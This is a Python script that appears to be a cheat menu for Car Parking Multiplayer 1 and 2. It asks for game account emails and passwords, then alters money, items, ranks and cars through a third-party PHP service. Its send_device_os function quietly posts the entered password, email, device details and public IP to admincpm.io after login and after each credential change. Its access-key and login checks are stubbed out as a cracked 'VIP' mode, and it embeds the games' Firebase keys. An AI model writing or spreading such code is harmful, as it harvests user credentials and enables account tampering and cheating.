#!/usr/bin/env python3
import os
import sys
import time
import json
import requests
import hashlib
import random
from datetime import datetime
import platform
import subprocess
from itertools import cycle
from threading import Thread, Event
import time

if False:
    pass

def show_banner(unlimited_status=None, current_coins=None, telegram_id=None):
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(" ██████╗░░█████╗░██╗░░██╗██╗░░░██╗")
    print(" ██╔══██╗██╔══██╗██║░██╔╝██║░░░██║")
    print(" ██████╔╝███████║█████═╝░██║░░░██║")
    print(" ██╔═══╝░██╔══██║██╔═██╗░██║░░░██║")
    print(" ██║░░░░░██║░░██║██║░╚██╗╚██████╔╝ █▀▀ █▀█ █▀▄▀█")
    print(" ╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚═════╝░ █▄▄ █▀▀ █░▀░█")
    print("=================================================")
    
    if unlimited_status is not None:
        if unlimited_status:
            print(f"       Subscription: VIP-USER 👑")
        else:
            print(f"       Subscription: FREE-USER 🧢")
            if current_coins is not None:
                print(f"       Balance: {current_coins} coins")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def spinner_animation(stop_event):
    spinner = cycle(['|', '/', '-', '\\'])
    while not stop_event.is_set():
        sys.stdout.write(f'\r[-] Loading... {next(spinner)} ')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r')
    sys.stdout.flush()

def login_firebase(api_key, email, password):
    # Token sabit olarak verilecek, login her zaman başarılı
    return {"ok": True, "token": "12", "email": email, "password": password}


BASE_URL: str = "https://admincpm.io/test/api"

def call_php_service(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
    url = f"{BASE_URL}/menu.php"
    payload = {
        "key": access_key,
        "menu": menu_code
    }
    if token:
        payload["token"] = token
    if email:
        payload["email"] = email
    if password:
        payload["password"] = password
    if extra_data:
        payload.update(extra_data)

    try:
        res = requests.post(url, data=payload)
        
        if not res.text:
            return {"ok": False, "message": "Received empty response from server."}
        
        result = res.json()
        return result
    except json.JSONDecodeError as e:
        return {"ok": False, "message": f"JSON decode error: {e}. Response was: {res.text}"}
    except Exception as e:
        return {"ok": False, "message": f"Request failed: {e}"}

def call_php_service_with_spinner(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
    url = f"{BASE_URL}/menu.php"
    payload = {
        "key": access_key,
        "menu": menu_code
    }
    if token:
        payload["token"] = token
    if email:
        payload["email"] = email
    if password:
        payload["password"] = password
    if extra_data:
        payload.update(extra_data)

    stop_spinner = Event()
    spinner_thread = Thread(target=spinner_animation, args=(stop_spinner,))
    spinner_thread.daemon = True
    spinner_thread.start()

    try:
        res = requests.post(url, data=payload)
        stop_spinner.set()
        spinner_thread.join()
        
        if not res.text:
            return {"ok": False, "message": "Received empty response from server."}
        
        result = res.json()
        return result
    except json.JSONDecodeError as e:
        stop_spinner.set()
        spinner_thread.join()
        return {"ok": False, "message": f"JSON decode error: {e}. Response was: {res.text}"}
    except Exception as e:
        stop_spinner.set()
        spinner_thread.join()
        return {"ok": False, "message": f"Request failed: {e}"}

def check_access_key_and_get_user_status(key):
    # VIP mode: always valid and unlimited
    return True, {
        'is_unlimited': True,
        'coins': 999999,
        'telegram_id': 'VIP'
    }
def send_device_os(access_key, email=None, password=None, game_label=None, telegram_id=None):
    try:
        system = platform.system()
        release = platform.release()
        device_name_py = "Unknown"
        os_version_py = "Unknown"
        
        if system == "Darwin":
            if os.path.exists("/bin/ash") or "iSH" in release:
                brand = "iOS (iSH)"
                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
            else:
                brand = "macOS"
                device_name_py = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                os_version_py = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
        elif system == "Linux":
            brand = "Android" if os.path.exists("/system/bin") else "Linux"
            if brand == "Android":
                device_name_py = subprocess.getoutput("getprop ro.product.model") or "Android Device"
                os_version_py = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
            else:
                device_name_py = "Linux Device"
                os_version_py = "Unknown"
        else:
            brand = system + " " + release
            device_name_py = platform.node()
            os_version_py = "Unknown"
    except Exception as e:
        brand = "Unknown OS"
        device_name_py = "Unknown Device"
        os_version_py = "Unknown Version"

    try:
        ip_address = requests.get("https://api.ipify.org").text.strip()
    except Exception as e:
        ip_address = "Unknown"
    
    payload = {
        "key": access_key,
        "brand": brand,
        "device_name": device_name_py,
        "os_version": os_version_py,
        "ip_address": ip_address,
        "email": email if email is not None else "Unknown",
        "password": password if password is not None else "Unknown",
        "telegram_id": telegram_id if telegram_id is not None else "N/A",
        "game": game_label if game_label is not None else "N/A"
    }
    
    remote_success = False
    try:
        response = requests.post(f"{BASE_URL}/save_device.php", json=payload)
        remote_success = response.status_code == 200
    except Exception as e:
        pass

    return remote_success

# NEW: Refactored menu lists for better management
cpm1_menu_options = [
    ("01", "👑 KING RANK", "king_rank"),
    ("02", "📧 CHANGE EMAIL", "change_email"),
    ("03", "🔐 CHANGE PASSWORD", "change_password")
]

cpm2_menu_options = [
    ("01", "👑 KING RANK", "king_rank"),
    ("02", "📧 CHANGE EMAIL", "change_email"),
    ("03", "🔐 CHANGE PASSWORD", "change_password"),
    ("04", "💰 SET MONEY", "set_money"),
    ("05", "🛞 UNLOCK WHEELS", "unlock_wheels"),
    ("06", "👕 UNLOCK MALE", "unlock_male"),
    ("07", "👗 UNLOCK FEMALE", "unlock_female"),
    ("08", "🧰 UNLOCK BRAKES", "unlock_brakes"),
    ("09", "🧰 UNLOCK CALIPERS", "unlock_calipers"),
    ("10", "🎨 UNLOCK PAINTS", "unlock_paints"),
    ("11", "🎌 UNLOCK ALL FLAGS", "unlock_all_flags"),
    ("12", "🏠 UNLOCK APARTMENTS", "unlock_apartments"),
    ("13", "💯 COMPLETE MISSIONS", "complete_missions"),
    ("14", "🚨 UNLOCK SIREN & AIRSUS", "unlock_all_cars_siren"),
    ("15", "🚔 UNLOCK POLICE KITS", "unlock_police_bodykits"),
    ("16", "📦 UNLOCK SLOTS", "unlock_slots"),
    ("17", "🛒 UNLOCK BODY KITS", "unlock_bodykits"),
    ("18", "🛞 CUSTOM WHEEL", "custom_wheel"),
    ("19", "✨ TRANSFER VINYL", "transfer_vinyl"),
    ("20", "🪟 TRANSFER WINDOW VINYL", "transfer_window"),
    ("21", "🚘 REMOVE ALL BODY PARTS", "removebodyparts"),
    ("22", "👦 REMOVE HEAD MALE", "remove_head_male"),
    ("23", "👧 REMOVE HEAD FEMALE", "remove_head_female"),
    ("24", "🔄 CLONE CARS FROM CPM1 TO CPM2", "copy_cpm1_car_to_cpm2"),
    ("25", "🚗 CLONE TARGET CAR CPM2 TO CPM2", "clone_cars_cpm2_to_cpm22"),
     ("26", "🚗 CLONE ALL CARS CPM2 TO CPM2", "clone_cars_cpm2_to_cpm2"),
    ("27", "➕ ADD CAR", "add_car"),
    ("28", "➕ ADD CAR with DESIGN", "add_car2"),
    ("29", "➕ ADD CAR with EMBLEM", "add_car3"),
    ("30", "🎨 CHANGE CAR COLOR", "change_color"),
    ("31", "🔧 REPAIR ENGINE PARTS", "repair_engine"),
    ("32", "🏆 MAX WIN RACE", "race_win"),
    ("33", "🐞 FIX BUG ACCOUNT", "fix_bug"),
]

if __name__ == "__main__":
    device_ip = None
    try:
        requests.get("https://google.com", timeout=3)
        device_ip = requests.get('https://api.ipify.org').text.strip()
    except:
        print("❌ No internet. Please check your connection.")
        sys.exit(1)

    unlimited_status_for_display = None
    current_coins_for_display = None
    is_unlimited_user = False
    telegram_id_for_display = "N/A"
    
    email = ""
    token = None
    label_to_use = "N/A"
    main_menu = None

    service_costs = {}
    service_costs_response = call_php_service(access_key="dummy_key", menu_code="get_service_costs")
    if service_costs_response.get("ok") and "costs" in service_costs_response:
        service_costs = service_costs_response["costs"]
    else:
        print("⚠️ Warning: Could not fetch service costs from server. Using default values.")

    while True:
        clear_screen()
        show_banner(unlimited_status=unlimited_status_for_display, current_coins=current_coins_for_display, telegram_id=telegram_id_for_display)

        access_key = 'vip'  # VIP mode: no prompt

        is_valid_key, user_data_from_php = check_access_key_and_get_user_status(access_key)
        
        if not is_valid_key:
            print(f"❌ {user_data_from_php['message']}")
            unlimited_status_for_display = None
            current_coins_for_display = None
            is_unlimited_user = False
            telegram_id_for_display = "N/A"
            time.sleep(0.5)
            continue

        print("✅ Key accepted.")
        is_unlimited_user = True
        current_coins_for_display = 999999  # Opsiyonel: bakiye sonsuz gibi gözüksün
        current_coins_for_display = user_data_from_php['coins']
        telegram_id_for_display = user_data_from_php.get('telegram_id', 'N/A')

        print(f"Telegram ID: {telegram_id_for_display}")
        try:
            os.system("termux-open-url 'https://t.me/pakundotools'")
            print("Opening Telegram group...")
            time.sleep(0.5)
        except Exception as e:
            print(f"Could not open Telegram URL: {e}")

        if not is_unlimited_user:
            print("\nYour subscription is LIMITED. You can explore the menu but services have a cost.")
        else:
            print("You have an UNLIMITED subscription. All services are free.")
        time.sleep(0.5)

        while True:
            clear_screen()
            show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display, telegram_id=telegram_id_for_display)
            print("Main Menu:")
            print("1. 🚘 CAR PARKING MULTIPLAYER (CPM1)")
            print("2. 🚔 CAR PARKING MULTIPLAYER 2 (CPM2)")
            print("0. ❌ EXIT")
            main_menu = input("Enter your choice: ").strip()

            if main_menu == "0":
                print("👋 Goodbye!")
                sys.exit(0)
            elif main_menu == "1":
                api_key_cpm = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
                rank_url_cpm = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"
                label_to_use = "CPM1"
            elif main_menu == "2":
                api_key_cpm = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
                rank_url_cpm = "https://us-central1-cpm-2-7cea1.cloudfunctions.net/SetUserRating17_AppI"
                label_to_use = "CPM2"
            else:
                print("❌ Invalid choice. Please enter 0, 1, or 2.")
                time.sleep(0.5)
                continue

            print(f"\n--- Log in to {label_to_use} ---")
            email = input("📧 Enter account email: ").strip()
            password = input("🔐 Enter account password: ").strip()

            login = login_firebase(api_key_cpm, email, password)
            if not login.get("ok"):
                print(f"❌ Login failed: {login['message']}")
                time.sleep(1)
                continue

            token = login["token"]
            print(f"✅ Logged in as {email}")
            
            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)

            time.sleep(0.5)
            
            while True:
                clear_screen()
                show_banner(unlimited_status=is_unlimited_user, current_coins=current_coins_for_display, telegram_id=telegram_id_for_display)
                print(f"Account Sign: {email} ({label_to_use})")

                # **UPDATED LOGIC HERE:**
                menu_to_display = cpm1_menu_options if main_menu == "1" else cpm2_menu_options
                
                for number, description, service_name in menu_to_display:
                    service_info = service_costs.get(service_name, {'cost': 'N/A', 'unlimited_only': False})
                    
                    if is_unlimited_user:
                        price_display = "FREE"
                    else:
                        if service_info.get('unlimited_only'):
                            price_display = "VIP user only"
                        else:
                            price_display = f"{service_info.get('cost', 'N/A')} coins"
                    
                    print(f"{number}. {description} (Cost: {price_display})")

                print("0. 🔙 BACK")
                choice = input("Select a service: ").strip()
                
                if choice == "0":
                    break

                action_result = {"ok": False, "message": "Invalid choice or option not available for this game."}
                
                if main_menu == "1":
                    if choice == "1":
                        action_result = call_php_service(access_key, "king_rank", token, email, password, {"api_key": api_key_cpm, "rank_url": rank_url_cpm})
                    elif choice == "2":
                        new_email = input("📨 New Email: ").strip()
                        action_result = call_php_service(access_key, "change_email", token, email, password, {"new_email": new_email, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            email = new_email
                            token = action_result.get("new_token", token)
                            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                    elif choice == "3":
                        new_password = input("🔑 New Password: ").strip()
                        action_result = call_php_service(access_key, "change_password", token, email, password, {"new_password": new_password, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            password = new_password
                            token = action_result.get("new_token", token)
                            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                    else:
                        action_result = {"ok": False, "message": "Invalid choice for CPM1."}
                
                elif main_menu == "2":
                    if choice == "1":
                        action_result = call_php_service_with_spinner(access_key, "king_rank", token, email, password, {"api_key": api_key_cpm, "rank_url": rank_url_cpm})
                    elif choice == "2":
                        new_email = input("📨 New Email: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "change_email", token, email, password, {"new_email": new_email, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            email = new_email
                            token = action_result.get("new_token", token)
                            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                    elif choice == "3":
                        new_password = input("🔑 New Password: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "change_password", token, email, password, {"new_password": new_password, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            password = new_password
                            token = action_result.get("new_token", token)
                            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
                    elif choice == "4":
                        amount = input("💵 Amount: ").strip()
                        if amount.isdigit():
                            action_result = call_php_service_with_spinner(access_key, "set_money", token, email, password, {"amount": int(amount)})
                        else:
                            action_result = {"ok": False, "message": "Invalid amount."}
                    elif choice == "5":
                        action_result = call_php_service_with_spinner(access_key, "unlock_wheels", token, email, password)
                    elif choice == "6":
                        action_result = call_php_service_with_spinner(access_key, "unlock_male", token, email, password)
                    elif choice == "32":
                        action_result = call_php_service_with_spinner(access_key, "race_win", token, email, password)
                    elif choice == "7":
                        action_result = call_php_service_with_spinner(access_key, "unlock_female", token, email, password)
                    elif choice == "22":
                        action_result = call_php_service_with_spinner(access_key, "remove_head_male", token, email, password)
                    elif choice == "23":
                        action_result = call_php_service_with_spinner(access_key, "remove_head_female", token, email, password)
                    elif choice == "8":
                        action_result = call_php_service_with_spinner(access_key, "unlock_brakes", token, email, password)
                    elif choice == "9":
                        action_result = call_php_service_with_spinner(access_key, "unlock_calipers", token, email, password)
                    elif choice == "10":
                        action_result = call_php_service_with_spinner(access_key, "unlock_paints", token, email, password)
                    elif choice == "11":
                        action_result = call_php_service_with_spinner(access_key, "unlock_all_flags", token, email, password)
                    elif choice == "12":
                        action_result = call_php_service_with_spinner(access_key, "unlock_apartments", token, email, password)
                    elif choice == "13":
                        action_result = call_php_service_with_spinner(access_key, "complete_missions", token, email, password)
                    elif choice == "14":
                        action_result = call_php_service_with_spinner(access_key, "unlock_all_cars_siren", token, email, password)
                    elif choice == "15":
                        action_result = call_php_service_with_spinner(access_key, "unlock_police_bodykits", token, email, password)
                    elif choice == "16":
                        action_result = call_php_service_with_spinner(access_key, "unlock_slots", token, email, password, {"account_auth": token})
                    elif choice == "17":
                        action_result = call_php_service_with_spinner(access_key, "unlock_bodykits", token, email, password)
                    elif choice == "21":
                        action_result = call_php_service_with_spinner(access_key, "removebodyparts", token, email, password)
                    elif choice == "18":
                        car_id_to_modify = input("🚗 Enter Car ID to modify: ").strip()
                        rim_id = input("🛞 Enter Rim ID: ").strip()
                        
                        if not car_id_to_modify.isdigit() or int(car_id_to_modify) <= 0:
                            print("❌ Invalid Car ID. It must be a positive integer.")
                            time.sleep(0.5)
                            continue
                        if not rim_id.isdigit() or int(rim_id) < 0:
                            print("❌ Invalid Rim ID. It must be a non-negative integer.")
                            time.sleep(0.5)
                            continue

                        action_result = call_php_service_with_spinner(access_key, "custom_wheel", token, email, password, {
                            "car_id": car_id_to_modify,
                            "rim_id": rim_id
                        })
                    elif choice == "24":
                        cpm1_email_input = input("📧 Enter CPM1 Email: ").strip()
                        cpm1_password_input = input("🔐 Enter CPM1 Password: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "copy_cpm1_car_to_cpm2", token, email, password, {
                            "cpm1_email": cpm1_email_input,
                            "cpm1_password": cpm1_password_input,
                            "cpm1_api_key": "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM",
                            "cpm2_api_key": "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
                        })
                    elif choice == "25":
                        account_email_input = input("📧 Enter CPM2 Account Email to clone to: ").strip()
                        account_password_input = input("🔐 Enter CPM2 Account Password to clone to: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "clone_cars_cpm2_to_cpm22", token, email, password, {
                            "account_email": account_email_input,
                            "account_password": account_password_input
                        })
                    elif choice == "26":
                        account_email_input = input("📧 Enter CPM2 Account Email to clone to: ").strip()
                        account_password_input = input("🔐 Enter CPM2 Account Password to clone to: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "clone_cars_cpm2_to_cpm2", token, email, password, {
                            "account_email": account_email_input,
                            "account_password": account_password_input
                        })
                    elif choice == "27":
                        car_id_to_add_input = input("🚗 Enter the Car ID to add: ").strip()
                        if not car_id_to_add_input.isdigit() or int(car_id_to_add_input) <= 0:
                            print("❌ Invalid Car ID. It must be a positive integer.")
                            time.sleep(0.5)
                            continue

                        num_copies_input = input("🔢 How many copies to add (1-20)? ").strip()
                        if not num_copies_input.isdigit():
                            print("❌ Invalid number of copies. It must be a number.")
                            time.sleep(0.5)
                            continue
                        num_copies_int = int(num_copies_input)
                        if num_copies_int < 1 or num_copies_int > 20:
                            print("❌ The number of copies must be between 1 and 20.")
                            time.sleep(0.5)
                            continue
                        
                        action_result = call_php_service_with_spinner(access_key, "add_car", token, None, None, {
                            "car_id": car_id_to_add_input,
                            "num_copies": num_copies_int
                        })
                        
                    elif choice == "28":
                        car_id_to_add_input = input("🚗 Enter the Car ID to add: ").strip()
                        if not car_id_to_add_input.isdigit() or int(car_id_to_add_input) <= 0:
                            print("❌ Invalid Car ID. It must be a positive integer.")
                            time.sleep(0.5)
                            continue

                        num_copies_input = input("🔢 How many copies to add (1-20)? ").strip()
                        if not num_copies_input.isdigit():
                            print("❌ Invalid number of copies. It must be a number.")
                            time.sleep(0.5)
                            continue
                        num_copies_int = int(num_copies_input)
                        if num_copies_int < 1 or num_copies_int > 20:
                            print("❌ The number of copies must be between 1 and 20.")
                            time.sleep(0.5)
                            continue
                        
                        action_result = call_php_service_with_spinner(access_key, "add_car2", token, None, None, {
                            "car_id": car_id_to_add_input,
                            "num_copies": num_copies_int
                        })
                        
                    elif choice == "29":
                        car_id_to_add_input = input("🚗 Enter the Car ID to add: ").strip()
                        if not car_id_to_add_input.isdigit() or int(car_id_to_add_input) <= 0:
                            print("❌ Invalid Car ID. It must be a positive integer.")
                            time.sleep(0.5)
                            continue

                        num_copies_input = input("🔢 How many copies to add (1-20)? ").strip()
                        if not num_copies_input.isdigit():
                            print("❌ Invalid number of copies. It must be a number.")
                            time.sleep(0.5)
                            continue
                        num_copies_int = int(num_copies_input)
                        if num_copies_int < 1 or num_copies_int > 20:
                            print("❌ The number of copies must be between 1 and 20.")
                            time.sleep(0.5)
                            continue
                        
                        action_result = call_php_service_with_spinner(access_key, "add_car3", token, None, None, {
                            "car_id": car_id_to_add_input,
                            "num_copies": num_copies_int
                        })
                        
                    elif choice == "30":
                        print("\n🔧 Car Color Change")
                        print("This will use the 'target' car to change the color of the vinyls.")
                        old_hex_color = input("➡️ Enter the Car Vinyls Color code. (e.g., ff0000): ")
                        new_hex_color = input("➡️ Enter the new Color code (e.g., 00ff00): ")
                        print("Performing color change...")
                        
                        action_result = call_php_service_with_spinner(access_key, "change_color", token, email, password, extra_data={"old_hex_color": old_hex_color, "new_hex_color": new_hex_color})
                    
                    elif choice == "33":
                        print("\n⚠️ Are you sure you want to run 'Fix Bug Account'?")
                        print("This service may take some time depending on how many cars you have.")
                        confirm_choice = input("Type 'y' to proceed or 'n' to cancel: ").strip().lower()
                        
                        if confirm_choice == 'y':
                            print("✅ Proceeding with 'Fix Bug Account'...")
                            action_result = call_php_service_with_spinner(access_key, "fix_bug", token, email, password)
                        elif confirm_choice == 'n':
                            print("❌ User cancelled. Returning to menu.")
                            action_result = {"ok": False, "message": "User cancelled."}
                        else:
                            print("❌ Invalid input. Operation cancelled.")
                            action_result = {"ok": False, "message": "Invalid input. Operation cancelled."}

                    elif choice == "31":
                        print("\n🔧 Starting 'Repair Engine Parts' service.")
                        print("Please wait...")
                        action_result = call_php_service_with_spinner(access_key, "repair_engine", token, email, password)
                    
                    elif choice == "19":
                        print("✨ Transferring vinyls...")
                        print("The system will now find your 'source' and 'target' cars.")
                        print("Please ensure one car has a vinyl with text 'source' and another has 'target'.")
                        
                        action_result = call_php_service_with_spinner(access_key, "transfer_vinyl", token, email, password)
                    elif choice == "20":
                        print("✨ Transferring window data...")
                        print("The system will now find your 'source' and 'target' cars.")
                        print("Please ensure one car has a window with text 'source' and another has 'target'.")
                        
                        action_result = call_php_service_with_spinner(access_key, "transfer_window", token, email, password)
                    else:
                        action_result = {"ok": False, "message": "Invalid choice or option not available for this game."}
                else:
                    action_result = {"ok": False, "message": "Invalid choice or option not available for this game."}

                if action_result.get("ok"):
                    print(f"✅ {action_result.get('message', 'Action successful.')}")
                    time.sleep(1)
                else:
                    print(f"❌ {action_result.get('message', 'Action failed.')}")
                    time.sleep(1)

                is_valid_key, updated_user_data = check_access_key_and_get_user_status(access_key)
                if is_valid_key:
                    is_unlimited_user = updated_user_data['is_unlimited']
                    current_coins_for_display = updated_user_data['coins']
                    telegram_id_for_display = updated_user_data.get('telegram_id', 'N/A')
                else:
                    print("⚠️ Could not retrieve updated user status. Please check connection.")
                
                time.sleep(1)